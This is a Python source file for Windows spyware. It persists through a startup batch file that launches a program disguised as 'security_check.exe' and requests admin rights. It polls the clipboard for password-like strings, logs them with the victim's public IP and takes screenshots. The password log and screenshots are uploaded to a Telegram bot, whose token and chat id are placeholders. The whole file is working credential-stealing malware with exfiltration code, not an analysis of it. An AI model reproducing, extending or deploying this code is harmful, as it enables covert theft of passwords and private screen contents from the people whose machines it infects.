import ctypes
from ctypes import windll
import getpass as gp
import http.client
import sys
from time import sleep
from datetime import datetime
import pyperclip
import regex as re
import requests
import glob
import time
import os
import pyautogui

MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
# telegram token and id
TOKEN = r'some_token'
ADMIN_ID = r'some_id'
USER_NAME = gp.getuser()
DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
               f'Windows/Start Menu/Programs/Startup/'
LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
SCREEN_PATH = f'C:/Users/{USER_NAME}/Downloads/'
# temporally variable for clipboard
CLIPBOARD_STRING = ''
# interval to send a log
interval = 60
# time start script
start_time = time.time()
# directory for screenshots
directory = 'screen_log'
# path for screenshots directory
screen_dir = os.path.join(SCREEN_PATH, directory)
# list for screenshots
screen_list = []


# Check startup
def check_startup():
    start_up = []
    start_file = 'open.bat'
    for apps in glob.glob(STARTUP_PATH):
        start_up.append(apps.split('\\')[-1])
        if start_file in start_up:
            return True
        else:
            return False


# check admin rights
def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# create bat
def create_bat():
    if check_startup():
        pass
    elif not check_startup():
        try:
            with open(STARTUP_PATH + '\\' + 'open.bat', 'w+') as bat_file:
                bat_file.write(f'start ""  {DOWNLOADS_PATH}')
        except:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


# Clean clipboard before start interception
def clipboard_cleaner():
    if windll.user32.OpenClipboard(None):
        windll.user32.EmptyClipboard()
        windll.user32.CloseClipboard()


# find digits and letters in string:
def interceptor_passwords(a_string):
    rx = re.compile(r'(?=\d++[A-Za-z]+[\w@]+|[a-zA-Z]++[\w@]+)[\w@]{2,}')
    return '\n'.join(rx.findall(a_string))


# ip finder
def ip_finder():
    conn = http.client.HTTPConnection('ifconfig.me')
    conn.request('GET', '/ip')
    try:
        return conn.getresponse().read()
    except:
        return 'Can not find ip'


# create directory for screenshots
def create_dir():
    try:
        os.mkdir(screen_dir)
    except FileExistsError:
        pass


# make screenshot
def screen_shot():
    pyautogui.screenshot().save(f'{screen_dir}/{MY_TIME}.png')


# send screenshots to telegram
def send_screen():
    os.chdir(f'{screen_dir}')
    for screen in glob.iglob('*.png'):
        screen_list.append(screen)
    for screen_shots in screen_list:
        for_send = screen_shots
        files = {'photo': open(f'{screen_dir}/{for_send}', 'rb')}
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={ADMIN_ID}', files=files)


# send log to telegram with time interval
def log_sender():
    global start_time
    if int(time.time() - start_time) >= interval:
        files = {
            'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
                      files=files)
        # reset start time
        start_time = time.time()


# clean logs in screenshot folder and list
def clean_logs():
    os.chdir(f'{screen_dir}')
    clean_log = os.listdir()
    for _ in clean_log:
        os.remove(_)
        screen_list.clear()


# Intercept pass,  write to file and send text log to Telegram
def start_loop():
    # string for intercept pass
    pass_string = ''
    global CLIPBOARD_STRING, start_time
    # variable for ip
    ip = ip_finder()
    while True:
        # start log send timer
        log_sender()
        # clean screenshots folder and list
        clean_logs()
        # assign string to clipboard:
        CLIPBOARD_STRING = pyperclip.paste()
        # create / open file for save passwords:
        f = open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'a')
        # check password in list and check is link or not:
        for _ in interceptor_passwords(CLIPBOARD_STRING):
            if CLIPBOARD_STRING != pass_string and 'http' not in CLIPBOARD_STRING:
                # validate pass
                caught_pass = interceptor_passwords(CLIPBOARD_STRING)
                if caught_pass is not None:
                    # add intercepted pass and used time and ip to doc:
                    print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
                    # make screenshot
                    screen_shot()
                    # send screenshot to telegram
                    send_screen()
                    f.close()
            # reassign clipboard to string
            pass_string = CLIPBOARD_STRING
        sleep(1)


def main():
    check_startup()
    check_admin()
    create_bat()
    clipboard_cleaner()
    create_dir()
    start_loop()


if __name__ == '__main__':
    main()
